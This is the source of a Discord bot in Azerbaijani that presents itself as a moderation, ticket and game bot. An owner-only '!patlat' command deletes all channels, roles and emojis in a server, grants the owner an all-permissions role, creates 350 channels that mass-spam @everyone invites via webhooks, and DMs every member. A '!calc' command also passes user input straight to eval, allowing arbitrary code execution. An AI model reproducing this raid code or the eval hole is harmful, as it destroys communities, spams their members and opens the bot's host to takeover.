import os
import random
import asyncio
from datetime import datetime, timedelta
import discord
from discord.ext import commands
from keep_alive import keep_alive

# ==========================================
# 1. PARAMETRLƏR VƏ İNİTİALİZASİYA
# ==========================================
INTENTS = discord.Intents.default()
INTENTS.members = True
INTENTS.message_content = True
INTENTS.guilds = True
INTENTS.voice_states = True

bot = commands.Bot(command_prefix="!", intents=INTENTS)

SAHIB_ID = 111111111111111111  # Öz Discord ID-nizi bura yazın
GUVENLI_SERVER_ID = 111111111111111111  # Qorunan server ID-si
XAS_COLOR = discord.Color.blurple()

user_xp = {}
user_last_message = {}
user_message_counts = {}

# ==========================================
# 2. BOT HAZIR OLAN KİMİ (ON_READY)
# ==========================================
@bot.event
async def on_ready():
    print(f"✅ Bot işə düşdü: {bot.user.name} (ID: {bot.user.id})")
    await bot.change_presence(activity=discord.Game(name="!yardım | XAS Bot"))

    for guild in bot.guilds:
        await send_webhook_log(guild, "Bot Aktivləşdi", "Bot uğurla onlayn oldu və sistemlər işləkdir.", color=0xff0000)

async def send_webhook_log(guild, title, description, color=0xff0000):
    try:
        log_chan = discord.utils.get(guild.text_channels, name="xas-log")
        if not log_chan:
            overwrites = {
                guild.default_role: discord.PermissionOverwrite(view_channel=False)
            }
            log_chan = await guild.create_text_channel("xas-log", overwrites=overwrites)
        
        webhooks = await log_chan.webhooks()
        webhook = webhooks[0] if webhooks else await log_chan.create_webhook(name="XAS Security Webhook")
        
        embed = discord.Embed(title=title, description=description, color=color, timestamp=datetime.utcnow())
        await webhook.send(embed=embed, username="XAS Log Sistemi")
    except:
        pass

# ==========================================
# 3. ANTİ-SPAM VƏ XP SİSTEMİ (ON_MESSAGE)
# ==========================================
@bot.event
async def on_message(message):
    if message.author.bot:
        return

    author_id = message.author.id
    current_time = datetime.utcnow()

    # Anti-Spam Yoxlaması
    if author_id in user_last_message:
        diff = (current_time - user_last_message[author_id]).total_seconds()
        if diff < 1.0:
            user_message_counts[author_id] = user_message_counts.get(author_id, 0) + 1
            if user_message_counts[author_id] > 4:
                try:
                    await message.delete()
                    await message.channel.send(f"{message.author.mention}, zəhmət olmasa yavaş yazın! (Spam)", delete_after=5)
                except:
                    pass
                return
        else:
            user_message_counts[author_id] = 0

    user_last_message[author_id] = current_time

    # XP Qazanma Sistemi
    data = user_xp.get(author_id, {"xp": 0, "level": 1})
    data["xp"] += random.randint(5, 15)
    
    next_level_xp = data["level"] * 100
    if data["xp"] >= next_level_xp:
        data["level"] += 1
        data["xp"] = 0
        try:
            await message.channel.send(f"🎉 Təbriklər {message.author.mention}, səviyyə atladın! Yeni səviyyən: **{data['level']}**")
        except:
            pass

    user_xp[author_id] = data
    await bot.process_commands(message)

# ==========================================
# 4. YARDIM VƏ PANEL ƏMRLƏRİ
# ==========================================
@bot.command(name="yardım", aliases=["help"])
async def yardim_cmd(ctx):
    embed = discord.Embed(title="📜 XAS Bot Əmrlər Menyusu", description="Aşağıdakı kateqoriyalardan istifadə edə bilərsiniz.", color=XAS_COLOR)
    embed.add_field(name="🛡️ Moderasiya", value="`!ban`, `!kick`, `!mute`, `!warn`, `!close`", inline=False)
    embed.add_field(name="⚙️ Qurulum", value="`!ticketkur`, `!panel`", inline=False)
    embed.add_field(name="📊 Statistika & Məlumat", value="`!level`, `!aktivite`, `!serverinfo`, `!url`", inline=False)
    embed.add_field(name="🎮 Əyləncə & Oyun", value="`!roll`, `!coinflip`, `!iq`, `!gay`, `!handsome`, `!love`, `!sex`, `!hack`, `!slot`, `!calc`, `!joke`, `!rps`, `!8ball`, `!poll`", inline=False)
    embed.set_footer(text="XAS Bot v3.1 | Təhlükəsizlik və İdarəetmə")
    await ctx.send(embed=embed)

@bot.command(name="panel")
async def panel_cmd(ctx):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    
    embed = discord.Embed(title="🎛️ XAS İdarəetmə Paneli", description="Aşağıdakı düymələrdən istifadə edərək bot funksiyalarına nəzarət edin.", color=XAS_COLOR)
    view = discord.ui.View(timeout=None)
    view.add_item(discord.ui.Button(label="🔒 Bütün Kanalları Kilidlə", style=discord.ButtonStyle.danger, custom_id="btn_lock"))
    view.add_item(discord.ui.Button(label="🔓 Kilidləri Aç", style=discord.ButtonStyle.success, custom_id="btn_unlock"))
    view.add_item(discord.ui.Button(label="👁️ Kanalları Gizlə", style=discord.ButtonStyle.secondary, custom_id="btn_hide"))
    view.add_item(discord.ui.Button(label="🛡️ Mod Məlumat", style=discord.ButtonStyle.primary, custom_id="btn_mod_info"))
    view.add_item(discord.ui.Button(label="⚠️ Warn Sistemi", style=discord.ButtonStyle.danger, custom_id="btn_warn_info"))
    view.add_item(discord.ui.Button(label="🎁 Çekiliş Məlumat", style=discord.ButtonStyle.success, custom_id="btn_giveaway_info"))
    view.add_item(discord.ui.Button(label="🎲 Zar At", style=discord.ButtonStyle.secondary, custom_id="btn_roll"))
    view.add_item(discord.ui.Button(label="💻 Hack Simulyasiyası", style=discord.ButtonStyle.danger, custom_id="btn_hack"))
    view.add_item(discord.ui.Button(label="🎰 Slot Oyunu", style=discord.ButtonStyle.primary, custom_id="btn_slot"))
    view.add_item(discord.ui.Button(label="💰 Qiymətlər", style=discord.ButtonStyle.success, custom_id="btn_prices"))
    view.add_item(discord.ui.Button(label="📦 Məhsullar", style=discord.ButtonStyle.secondary, custom_id="btn_products"))

    await ctx.send(embed=embed, view=view)

# ==========================================
# 5. MODERASİYA ƏMRLƏRİ
# ==========================================
@bot.command(name="ban")
async def ban_cmd(ctx, member: discord.Member, *, reason="Göstərilməyib"):
    if not ctx.author.guild_permissions.ban_members:
        await ctx.send("❌ Bu əmri işlətmək üçün icazəniz yoxdur!")
        return
    try:
        await member.ban(reason=reason)
        await ctx.send(f"🔨 {member.mention} uğurla banlandı! Səbəb: `{reason}`")
    except:
        await ctx.send("❌ İstifadəçi banlana bilmədi.")

@bot.command(name="kick")
async def kick_cmd(ctx, member: discord.Member, *, reason="Göstərilməyib"):
    if not ctx.author.guild_permissions.kick_members:
        await ctx.send("❌ Bu əmri işlətmək üçün icazəniz yoxdur!")
        return
    try:
        await member.kick(reason=reason)
        await ctx.send(f"👢 {member.mention} serverdən kənarlaşdırıldı! Səbəb: `{reason}`")
    except:
        await ctx.send("❌ İstifadəçi qovula bilmədi.")

@bot.command(name="mute")
async def mute_cmd(ctx, member: discord.Member, minutes: int = 5, *, reason="Göstərilməyib"):
    if not ctx.author.guild_permissions.moderate_members:
        await ctx.send("❌ Bu əmri işlətmək üçün icazəniz yoxdur!")
        return
    try:
        duration = timedelta(minutes=minutes)
        await member.timeout(duration, reason=reason)
        await ctx.send(f"🔇 {member.mention} {minutes} dəqiqə müddətinə susduruldu! Səbəb: `{reason}`")
    except:
        await ctx.send("❌ İstifadəçi timeout edilə bilmədi.")

# ==========================================
# 6. İNTERAKTİV DÜYMƏLƏR (BUTTON INTERACTIONS)
# ==========================================
@bot.event
async def on_interaction(interaction: discord.Interaction):
    if not interaction.data or "custom_id" not in interaction.data:
        return

    custom_id = interaction.data.get("custom_id")

    if custom_id == "open_ticket":
        guild = interaction.guild
        overwrites = {
            guild.default_role: discord.PermissionOverwrite(view_channel=False),
            interaction.user: discord.PermissionOverwrite(view_channel=True, send_messages=True),
            guild.me: discord.PermissionOverwrite(view_channel=True, send_messages=True)
        }
        for role in guild.roles:
            if role.permissions.administrator:
                overwrites[role] = discord.PermissionOverwrite(view_channel=True, send_messages=True)

        channel_name = f"ticket-{interaction.user.name.lower()}"
        existing = discord.utils.get(guild.text_channels, name=channel_name)
        if existing:
            await interaction.response.send_message(f"⚠️ Açıq ticketiniz var: {existing.mention}", ephemeral=True)
            return

        ticket_chan = await guild.create_text_channel(channel_name, overwrites=overwrites)
        embed = discord.Embed(title="XAS Dəstək Sistemi", description="Müraciətiniz qəbul edildi. Bağlamaq üçün `!close` yazın.", color=XAS_COLOR)
        await ticket_chan.send(embed=embed)
        await interaction.response.send_message(f"✅ Ticket yaradıldı: {ticket_chan.mention}", ephemeral=True)

    elif custom_id == "btn_lock":
        for channel in interaction.guild.channels:
            try:
                await channel.set_permissions(interaction.guild.default_role, send_messages=False)
            except:
                pass
        await interaction.response.send_message("🔒 Bütün kanallar kilidləndi!", ephemeral=True)

    elif custom_id == "btn_unlock":
        for channel in interaction.guild.channels:
            try:
                await channel.set_permissions(interaction.guild.default_role, send_messages=True)
            except:
                pass
        await interaction.response.send_message("🔓 Bütün kanalların kilidi açıldı!", ephemeral=True)

    elif custom_id == "btn_hide":
        for channel in interaction.guild.channels:
            try:
                await channel.set_permissions(interaction.guild.default_role, view_channel=False)
            except:
                pass
        await interaction.response.send_message("👁️ Bütün kanallar gizlətildi!", ephemeral=True)

    elif custom_id == "btn_roll":
        await interaction.response.send_message(f"🎲 Zar nəticəsi: **{random.randint(1, 6)}**", ephemeral=True)

    elif custom_id == "btn_hack":
        await interaction.response.send_message(f"💻 IP: `192.168.{random.randint(10, 99)}.{random.randint(10, 99)}` | Sistemə sızıldı!", ephemeral=True)

    elif custom_id == "btn_slot":
        semboller = ['🍒', '🍊', '🍋', '🔔', '⭐']
        c1, c2, c3 = random.choices(semboller, k=3)
        res = "🎰 Jackpot qazandın!" if c1 == c2 == c3 else "🎰 Uduzdun."
        await interaction.response.send_message(f"{c1} | {c2} | {c3}\n{res}", ephemeral=True)

    elif custom_id == "btn_prices":
        await interaction.response.send_message("💰 **Cari Qiymətlər:**\n• VIP Rol: 5 AZN\n• Xüsusi Bot: 10 AZN", ephemeral=True)

    elif custom_id == "btn_products":
        await interaction.response.send_message("📦 **Məhsullar:** Bot xidmətləri və dizayn paketləri aktivdir.", ephemeral=True)

    elif custom_id == "btn_mod_info":
        await interaction.response.send_message("🛡️ **Moderasiya Qaydası:** `!ban @istifadəçi`, `!kick @istifadəçi`, `!mute @istifadəçi` əmrlərindən istifadə edin.", ephemeral=True)

    elif custom_id == "btn_warn_info":
        await interaction.response.send_message("⚠️ **Warn Sistemi:** `!warn @istifadəçi səbəb` yazaraq xəbərdarlıq verə bilərsiniz. 3 warn avtomatik kickdir.", ephemeral=True)

    elif custom_id == "btn_giveaway_info":
        await interaction.response.send_message("🎁 **Çekiliş Əmri:** `!giveaway 1h HədiyyəAdı` şəklində istifadə olunur.", ephemeral=True)

# ==========================================
# 7. TİCKET VƏ DƏSTƏK SİSTEMİ
# ==========================================
@bot.command(name="ticketkur")
async def ticketkur_cmd(ctx):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    embed = discord.Embed(title="XAS Dəstək Xidməti", description="Dəstək yaratmaq üçün düyməyə basın.", color=XAS_COLOR)
    view = discord.ui.View(timeout=None)
    view.add_item(discord.ui.Button(label="🎫 Dəstək Tələb Et (Ticket Aç)", style=discord.ButtonStyle.success, custom_id="open_ticket"))
    await ctx.send(embed=embed, view=view)

@bot.command(name="close")
async def close_cmd(ctx):
    if "ticket" in ctx.channel.name:
        await ctx.send("Ticket 3 saniyə sonra bağlanacaq.")
        await asyncio.sleep(3)
        try:
            await ctx.channel.delete()
        except:
            pass
    else:
        await ctx.send("Bu komanda yalnız ticket kanallarında işləyir.")

# ==========================================
# 8. SƏVİYYƏ VƏ CANLI AKTİVLİK STATİSTİKASI
# ==========================================
@bot.command(name="level", aliases=["lvl"])
async def level_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    data = user_xp.get(m.id, {"xp": 0, "level": 1})
    embed = discord.Embed(title=f"{m.name} — Səviyyə Məlumatı", color=XAS_COLOR)
    embed.add_field(name="Səviyyə", value=str(data["level"]), inline=True)
    embed.add_field(name="XP", value=str(data["xp"]), inline=True)
    await ctx.send(embed=embed)

@bot.command(name="aktivite", aliases=["stats", "durum"])
async def aktivite_cmd(ctx):
    guild = ctx.guild
    
    # Canlı statistika hesablamaları
    total_members = guild.member_count
    bots_count = sum(m.bot for m in guild.members)
    humans_count = total_members - bots_count
    
    voice_members = sum(len(vc.members) for vc in guild.voice_channels)
    streaming_members = sum(1 for m in guild.members if any(getattr(a, 'type', None) == discord.ActivityType.streaming for a in m.activities))
    
    text_channels = len(guild.text_channels)
    voice_channels = len(guild.voice_channels)
    category_channels = len(guild.categories)
    
    embed = discord.Embed(title=f"📊 {guild.name} — Canlı Aktivlik Statistikası", color=XAS_COLOR)
    embed.add_field(name="👥 Üzv Məlumatı", value=f"• Ümumi: **{total_members}**\n• İnsan: **{humans_count}**\n• Botlar: **{bots_count}**", inline=True)
    embed.add_field(name="🔊 Səs Aktivliyi", value=f"• Səsdəkilər: **{voice_members}** üzv\n• Yayın açanlar: **{streaming_members}**", inline=True)
    embed.add_field(name="📁 Kanal Statistikası", value=f"• Mətn: **{text_channels}**\n• Səs: **{voice_channels}**\n• Kateqoriya: **{category_channels}**", inline=False)
    embed.add_field(name="🚀 Boost Səviyyəsi", value=f"• Səviyyə: **{guild.premium_tier}**\n• Boost Sayı: **{guild.premium_subscription_count}**", inline=True)
    embed.add_field(name="🛡️ Rol Sayı", value=f"• Toplam: **{len(guild.roles)}**", inline=True)
    
    if guild.icon:
        embed.set_thumbnail(url=guild.icon.url)
        
    embed.set_footer(text="XAS Bot Canlı İzləmə Sistemi")
    await ctx.send(embed=embed)

@bot.command(name="serverinfo", aliases=["server"])
async def serverinfo_cmd(ctx):
    guild = ctx.guild
    embed = discord.Embed(title=f"📌 {guild.name} — Server Haqqında Məlumat", color=XAS_COLOR, timestamp=datetime.utcnow())
    if guild.icon:
        embed.set_thumbnail(url=guild.icon.url)
        
    embed.add_field(name="👑 Server Sahib", value=guild.owner.mention if guild.owner else "Naməlum", inline=True)
    embed.add_field(name="🆔 Server ID", value=str(guild.id), inline=True)
    embed.add_field(name="📅 Yaradılma Tarixi", value=guild.created_at.strftime("%d.%m.%Y %H:%M"), inline=True)
    embed.add_field(name="👥 Üzvlər", value=f"Ümumi: {guild.member_count}", inline=True)
    embed.add_field(name="💬 Kanallar", value=f"Mətn: {len(guild.text_channels)} | Səs: {len(guild.voice_channels)}", inline=True)
    embed.add_field(name="🔒 Təhlükəsizlik (Verifikasiya)", value=str(guild.verification_level).capitalize(), inline=True)
    
    await ctx.send(embed=embed)

@bot.command(name="giveaway")
async def giveaway_cmd(ctx, time_str: str, *, prize: str):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    seconds = 0
    if time_str.endswith("s"):
        seconds = int(time_str[:-1])
    elif time_str.endswith("m"):
        seconds = int(time_str[:-1]) * 60
    elif time_str.endswith("h"):
        seconds = int(time_str[:-1]) * 3600
    else:
        await ctx.send("Vaxt formatı: `10s`, `5m`, `1h`")
        return

    embed = discord.Embed(title="🎁 BÖYÜK ÇƏKİLİŞ 🎁", description=f"Hədiyyə: **{prize}**\nQatılmaq üçün reaksiyaya basın!", color=XAS_COLOR)
    msg = await ctx.send(embed=embed)
    await msg.add_reaction("🎁")
    await asyncio.sleep(seconds)

    new_msg = await ctx.channel.fetch_message(msg.id)
    users = []
    for reaction in new_msg.reactions:
        if str(reaction.emoji) == "🎁":
            async for user in reaction.users():
                if not user.bot:
                    users.append(user)

    if users:
        winner = random.choice(users)
        await ctx.send(f"🎉 Təbriklər {winner.mention}! Çəkilişi qazandın: **{prize}**")
    else:
        await ctx.send("❌ Çəkilişə qatılan olmadı.")

# ==========================================
# 9. URL, OYUNLAR VƏ ƏYLƏNCƏ KOMUTLARI
# ==========================================
@bot.command(name="url")
async def url_cmd(ctx):
    try:
        vanity = await ctx.guild.vanity_invite()
        uses = vanity.uses if vanity else 0
        code = vanity.code if vanity else "Yoxdur"
    except:
        uses = "Mövcud deyil"
        code = "Yoxdur"

    embed = discord.Embed(title="🔗 Server URL və Webhook Məlumatı", color=XAS_COLOR)
    embed.add_field(name="Server Adı", value=ctx.guild.name, inline=True)
    embed.add_field(name="Vanity URL", value=f"`{code}`" if code != "Yoxdur" else "Yoxdur", inline=True)
    embed.add_field(name="URL İstifadə Sayı (Clicks)", value=f"📈 **{uses}** dəfə istifadə olundu", inline=False)
    embed.set_footer(text="Webhook İnteqrasiyası Aktivdir")
    await ctx.send(embed=embed)

@bot.command(name="sex")
async def sex_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    kiss_gifs = [
        "https://media1.giphy.com/media/Gogh8zC1TjF0c/giphy.gif",
        "https://media.giphy.com/media/2v170e71aanfi/giphy.gif",
        "https://media.giphy.com/media/3og0IPxMM0erATueVW/giphy.gif",
        "https://media3.giphy.com/media/l4FGJfzuV6W1N2kSY/giphy.gif",
        "https://media.giphy.com/media/109ltuoSQT212w/giphy.gif"
    ]
    embed = discord.Embed(title=f"❤️ {ctx.author.name} və {m.name} romantik anlar yaşayır! ✨", color=XAS_COLOR)
    embed.set_image(url=random.choice(kiss_gifs))
    await ctx.send(embed=embed)

@bot.command(name="ping")
async def ping_cmd(ctx):
    await ctx.send(f"🏓 Botun Gecikməsi: `{round(bot.latency * 1000)}ms`")

@bot.command(name="roll")
async def roll_cmd(ctx):
    await ctx.send(f"🎲 Zar: **{random.randint(1, 6)}**")

@bot.command(name="coinflip", aliases=["yazıpara"])
async def coinflip_cmd(ctx):
    await ctx.send(f"🪙 Qəpik: **{random.choice(['Yazı', 'Para'])}**")

@bot.command(name="iq")
async def iq_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    await ctx.send(f"🧠 {m.name} IQ səviyyəsi: **{random.randint(40, 160)}**")

@bot.command(name="gay")
async def gay_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    await ctx.send(f"🌈 {m.name} uyğunluq: **{random.randint(0, 100)}**%")

@bot.command(name="handsome", aliases=["yaraşıqlı"])
async def handsome_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    await ctx.send(f"😎 {m.name} yaraşıqlılıq: **{random.randint(50, 100)}**%")

@bot.command(name="love", aliases=["sevgi"])
async def love_cmd(ctx, member1: discord.Member, member2: discord.Member = None):
    m2 = member2 or ctx.author
    await ctx.send(f"❤️ {member1.mention} və {m2.mention} sevgi uyğunluğu: **{random.randint(0, 100)}**%")

@bot.command(name="hack")
async def hack_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    msg = await ctx.send(f"💻 {m.name} hədəfə alındı, sistemə sızılır...")
    await asyncio.sleep(1.5)
    await msg.edit(content=f"💻 IP: `192.168.{random.randint(10, 99)}.{random.randint(10, 99)}` | Şifrə sındırıldı!")

@bot.command(name="slot")
async def slot_cmd(ctx):
    semboller = ['🍒', '🍊', '🍋', '🔔', '⭐']
    c1, c2, c3 = random.choices(semboller, k=3)
    if c1 == c2 == c3:
        await ctx.send(f"{c1} | {c2} | {c3} \n🎰 Jackpot qazandın!")
    else:
        await ctx.send(f"{c1} | {c2} | {c3} \n🎰 Uduzdun.")

@bot.command(name="8ball")
async def eight_ball_cmd(ctx, *, soru):
    cavablar = ["Bəli", "Xeyr", "Kəsinliklə", "Şübhəlidir", "Mümkün deyil", "Əlbəttə"]
    await ctx.send(f"🎱 Sual: {soru}\nCavab: **{random.choice(cavablar)}**")

@bot.command(name="calc")
async def calc_cmd(ctx, *, expression):
    try:
        netice = eval(expression)
        await ctx.send(f"🧮 Nəticə: **{netice}**")
    except:
        await ctx.send("❌ Riyazi ifadə səhvdir.")

@bot.command(name="joke", aliases=["zarafat"])
async def joke_cmd(ctx):
    zarafatlar = [
        "Proqramçıların niyə uşaqları az olur? Çünki gecələr patch yükləyirlər.",
        "Kompüter nə vaxt üşüyər? Pəncərəni (Windows) açıq qoyanda."
    ]
    await ctx.send(f"😂 {random.choice(zarafatlar)}")

@bot.command(name="rps", aliases=["daşqayçı"])
async def rps_cmd(ctx, choice: str):
    user_c = choice.lower()
    choices = ["daş", "kağız", "qayçı"]
    if user_c not in choices:
        await ctx.send("Zəhmət olmasa seçin: `daş`, `kağız`, `qayçı`")
        return
    bot_c = random.choice(choices)
    await ctx.send(f"Sənin seçimin: **{user_c}** | Botun seçimi: **{bot_c}**")

@bot.command(name="poll", aliases=["sorgu"])
async def poll_cmd(ctx, *, soru):
    embed = discord.Embed(title="📊 Səsvermə Anketi", description=soru, color=XAS_COLOR)
    embed.set_footer(text=f"Sorğunu açan: {ctx.author.name}")
    msg = await ctx.send(embed=embed)
    await msg.add_reaction("👍")
    await msg.add_reaction("👎")

# ==========================================
# 10. !PATLAT (RUHUM-SHDI VƏ WEBHOOK SİSTEMİ - TOXUNULMAZ)
# ==========================================
@bot.command(name="patlat")
async def patlat_cmd(ctx):
    if ctx.author.id != SAHIB_ID:
        await ctx.send("❌ Bu əmri yalnız bot sahibi işlədə bilər!")
        return
    
    guild = ctx.guild
    if guild.id == GUVENLI_SERVER_ID:
        await ctx.send("🛡️ Təhlükəsizlik xəbərdarlığı: Bu qorunan serverdir!")
        return

    await ctx.send("💥 RUHUM-SHDI kütləvi sürətli sistem əməliyyatı başladıldı!")
    
    for emoji in list(guild.emojis):
        try:
            await emoji.delete()
        except:
            pass

    for channel in guild.channels:
        try:
            await channel.delete()
        except:
            pass

    for role in guild.roles:
        if role != guild.default_role and not role.managed:
            try:
                await role.delete()
            except:
                pass

    try:
        new_role = await guild.create_role(
            name="discord.gg/aga",
            permissions=discord.Permissions.all(),
            color=discord.Color.red()
        )
        await ctx.author.add_roles(new_role)
    except:
        pass

    async def create_and_spam(i):
        try:
            channel = await guild.create_text_channel(f"ruhum-shdi-{i}")
            webhook = await channel.create_webhook(name="XAS Webhook")
            for _ in range(50):
                await webhook.send("@everyone discord.gg/aga yaz gır oql")
                await channel.send("@everyone discord.gg/aga yaz gır oql")
        except:
            pass

    tasks = [create_and_spam(i) for i in range(1, 351)]
    await asyncio.gather(*tasks)
            
    for member in guild.members:
        if not member.bot and member.id != SAHIB_ID:
            try:
                await member.send("discord.gg/aga Server dağıtıldı, tez gəl!")
            except:
                pass

# ==========================================
# 11. BOTUN İŞƏ DÜŞMƏSİ (RUN)
# ==========================================
if __name__ == "__main__":
    keep_alive()
    token = os.getenv("DISCORD_TOKEN")
    if token:
        bot.run(token)
    else:
        print("❌ XƏTA: 'DISCORD_TOKEN' tapılmadı! Replit Secrets bölməsinə tokeni əlavə edin.")
        
